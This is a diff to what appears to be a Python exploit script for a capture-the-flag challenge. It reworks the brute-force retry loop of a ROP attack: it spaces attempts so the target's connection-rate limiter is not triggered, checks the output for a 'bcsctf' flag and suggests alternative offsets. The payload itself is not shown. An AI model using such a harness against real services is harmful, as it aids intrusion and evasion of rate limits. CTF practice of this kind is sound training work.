@@ -266,19 +266,24 @@ def attempt_before_data(r):
     return b"Data?" not in r
 
 def main():
-    tries = int(os.environ.get("TRIES", "40"))
+    import time
+    tries = int(os.environ.get("TRIES", "25"))
+    gap   = float(os.environ.get("GAP", "3"))   # seconds between attempts (avoid xinetd cps limit)
     for i in range(tries):
         print(f"[*] attempt {i+1}/{tries} (OFF={hex(OFF)})")
+        res = None
         try:
             res = attempt()
-        except (EOFError, Exception) as e:
-            log.warning(f"attempt error: {e}")
+        except Exception as e:
+            log.warning(f"attempt error: {type(e).__name__}: {e}")
             try: io.close()
             except: pass
-            res = None
-        if res:
+        if res == "flag" or (isinstance(res, str) and res.startswith("bcsctf")):
             return
-    log.failure("no success after retries; try a different OFF (0x38/0x48/0x20)")
+        if res:  # ROP fired but no flag captured -> stop and let user see interactive
+            return
+        time.sleep(gap)     # spacing keeps the service's connection-rate limiter happy
+    log.failure("no success after retries; try OFF=0x48 / 0x20, or raise TRIES/GAP")
 
 if __name__ == "__main__":
     main()
